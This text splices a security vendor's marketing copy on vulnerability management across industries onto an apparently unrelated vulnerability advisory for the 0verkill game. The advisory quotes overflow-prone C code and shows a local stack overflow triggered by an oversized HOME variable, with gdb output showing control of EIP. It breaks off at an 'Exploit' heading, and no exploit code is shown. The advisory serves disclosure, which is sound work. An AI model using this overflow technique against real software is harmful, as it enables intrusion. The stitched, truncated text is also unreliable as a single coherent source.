## **Vulnerability Management for a Variety of Industries**

Nearly every industry relies on applications and networks to conduct business, though some have more stringent security requirements than others. Organizations in the aviation, automotive, healthcare, and financial sectors have some of the strongest security regulations. Layers of security during software and application development as well as after product deployment are necessary to keep consumers safe and organizations compliant.

![airplane icon](https://www.beyondsecurity.com/app/uploads/2024/01/fta-beyond-security-vulnerabilitiesaviation.png)

### [Aviation](https://www.beyondsecurity.com/resources/guides/aviation-software-testing-guide)

Cybersecurity is crucial to the aviation industry. Travelers in the sky need to be protected from any attacks that can prevent airlines from operating normally. Those same customers need to have their payment and sensitive data protected when purchasing a ticket.

### [Automotive](https://www.beyondsecurity.com/resources/guide/how-fuzz-testing-helps-secure-automotive-industry)

Wireless connectivity is becoming commonplace inside of new vehicles. Automotive connectivity to WIFI and Bluetooth are making vehicles a bigger target for cybercriminals. One vulnerability can take down any vehicle with that technology. DAST, Black Box Fuzzing, and SAST during development are a solid foundation of security to prevent these attacks.

![](https://www.beyondsecurity.com/app/uploads/2024/01/fta-beyond-security-vulnerabilities-automative.png)

![heartbeat](https://www.beyondsecurity.com/app/uploads/2024/01/fta-beyond-security-vulnerabilities-healthcare.png)

### [Healthcare and Medical](https://www.beyondsecurity.com/resources/guides/security-testing-for-networked-medical-devices)

Wireless technology and application software are being used more in medical devices to automate and monitor individual healthcare needs. Device security is the utmost priority, preventing risks that can directly endanger lives. Application security is needed to prevent cyber attackers from tampering with devices and stealing private healthcare data. SAST and DAST during development can help find vulnerabilities that can compromise these devices.

### Critical Infrastructure and Industrial Facilities

Water, power, and gas are some prime targets for large scale attacks. The best way to keep cyberattackers from taking down an entire city’s water supply is to create a layered cybersecurity portfolio. From the start, vulnerabilities need to be identified, remediated, and constantly monitored to prevent a mass standstill of public utilities.

![lightning bolt icon](https://www.beyondsecurity.com/app/uploads/2024/01/fta-beyond-security-vulnerabilities-critical-industries.png)

![factory](https://www.beyondsecurity.com/app/uploads/2024/01/fta-beyond-security-vulnerabilities-manufactures.png)

### Discrete Manufacturers

Manufacturing industries keep building and assembling essential pieces for everyday life. Any attack on that automation would create a bottleneck in multiple industries that rely on these products. A disruption in manufacturing has been proven to drive up prices and create a negative workflow ripple worldwide. Using layered security solutions prior to deployment and scanning afterwards will help prevent any shutdown.

### Financial

Financial institutions are still top cyberattacker targets. Monetary apps for banks, credit unions, investment, and retirement firms need the highest cybersecurity measures. Security that prevents cyberattacks should be implemented during development and embedded directly into these applications. Compliance for this industry is only growing with each reported breach.

0verkill - little simple vulnerability.

I.  Entry.

    Vulnerability is game 0verkill. There is some little bugs in
clinet / server.

II. Vulnerability details.

  a) client:

    Vulnerability function is load_cfg(), save_cfg() and maybe
send_message().
There is simple buffer overflow bugs:

"in file client.c"
void load_cfg(char *host,char *name,int *color)
{
...
...
        unsigned char txt[256];

#ifndef WIN32
        sprintf(txt,"%s/%s",getenv("HOME"),CFG_FILE);    //
first overflow
#else
        sprintf(txt,"./%s",CFG_FILE);
#endif
...
...
        a=strlen(txt);
...
...
        memcpy(host,txt,strlen(txt)+1);                  //
second overflow
...
...
        a=strlen(txt);
...
...
        memcpy(name,txt,strlen(txt)+1);                  //
third overflow
...
...
}

"in file client.c"
void save_cfg(char *host,char *name,int color)
{
...
...
        unsigned char txt[256];

#ifndef WIN32
        sprintf(txt,"%s/%s",getenv("HOME"),CFG_FILE);    //
overflow
#else
        sprintf(txt,"./%s",CFG_FILE);
#endif
...
...
}

"in file client.c"
void send_message(char *msg)
{
        static unsigned char packet[MAX_MESSAGE_LENGTH+2];
        int a;

        a=strlen(msg)+1;
	packet[[0]](#0)=P_MESSAGE;
        memcpy
(packet+1,msg,a);                                       // maybe
it's possible overflow
        send_packet(packet,a+1,(struct sockaddr *)
(&server),my_id,0);
}

First we look for function load_cfg(). If we compiled 0verkill
on other system that Windows
we can set HOME and we can do overflow array txt (it's first
overflow). Look:

root@darkstar:~root/all/gry/0verkill# HOME=`perl -
e 'print "A"x300'`
root@darkstar:~root/all/gry/0verkill# gdb ./0verkill

Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty"
for details.
This GDB was configured as "i386-slackware-linux"...
(gdb) r
Starting program: /root/root/all/gry/0verkill/./0verkill

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) i r eip
eip            0x41414141       0x41414141
(gdb)

OK. Now we look for second and third bug... function memcpy()
copy from array txt to host (in second
bug) and from txt to name (thirs bug) bytes. We have controle on
array txt by setting HOME. Memcpy copy
strlen(txt)+1 bytes. Host and name is argument for load_cfg()
function. This function is called by main()
and there is declarate host and name array:

"in file client.c"
int main(int argc,char **argv)
{
...
...
        char host[MAX_HOST_LEN+1];
        char name[MAX_NAME_LEN+1];
...
...
        memset(host,0,MAX_HOST_LEN+1);
...
...
        load_cfg(host,name,&color);
...
...
}

Now looked for file cfg.h:

"in file cfg.h"
...
...
#define MAX_NAME_LEN 24  /* maximal length of player's name */
#define MAX_HOST_LEN 64  /* maximal length of hostname */
...
...
" -=[ EOF ]=- "

... and now look for function save_cfg(). There is bug like that
first bug in function load_cfg().
Now look for function send_message(). There is bad using
function memcpy() (like that second and third
bug in load_cfg() function) and maybe it is possible to do
buffer overflow atack. This function read
argument *msg. Call to function send_message() is in function
play(). Looked:

"in file client.c"
void play(void)
{
...
...
        char string[[80]](#80);
...
...
                if (chat)
		{
		                ...
		                ...
                                case 1:
		                char 0;
                                send_message(string);
				...
				...
		}
...
...
}

MAX_MESSAGE_LENGTH is defined i cfg.h file too look:

"in file cfg.h"
...
...
#define MAX_MESSAGE_LENGTH 70  /* maximal length of chat message
*/
...
...
" -=[ EOF ]=- "

packet is array 72, string is array 80 and maybe there is
possible in this situation in function
send_message() do buffer overflow atack becouse string is
argument for send_message() function.

  b) server, compiled on Windows platform

There is bug in function parse_command_line() and maybe in
function GetLastErrorText(). Looked for
function parse_command_line():

"in file server.c"
void parse_command_line(int argc,char **argv)
{
        int a;
...
#ifdef WIN32
                a=getopt(argc,argv,"hl:np:ri:Ic");
...
...
#endif
                switch(a)
		{
...
...
#ifdef WIN32
...
...
                        case 'i': {     /* install service */
                                char    username[[80]](#80),
                                        *pass=NULL;
						...
...
                                        if ( (pass=strchr
(optarg, '/'))==NULL ) {
                                                strcpy(username,
optarg);
                                                memcpy(username,
optarg, sizeof(username)-1);
...
...
}

We have simple bufer overflow by call strcpy(). I don't know why
autor 2 times copying argument
in to the array. First by call strcpy() and second time by call
memcpy()...
Function GetLastErrorText() have call sprintf that in theory
could do buffer overflow, but i couldn't
find how to fill argument for sprintf() who in theory could do
overflow. Look:

"in file server.c"
LPTSTR GetLastErrorText(LPTSTR lpszBuf, DWORD dwSize) {
...
        LPTSTR  lpszTemp=NULL;
...
...
        dwRet=FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER |
FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_ARGUMENT_ARRAY, NULL,
                globErr, LANG_NEUTRAL, (LPTSTR)&lpszTemp, 0,
NULL);
...
...
                sprintf(lpszBuf, ": %u: %s", globErr,
lpszTemp); // there :P
...
...
}

IpszBuf is argument for function GetLastErrorText(), lpszTemp is
filled prbably by function FormatMessage();
but i couldn't find her.

III. Exploit.

Simple exploit for local bug in client 0verkill:

/*

 * Greetz: [greetz on my web] && other my friends (you know who
you are)
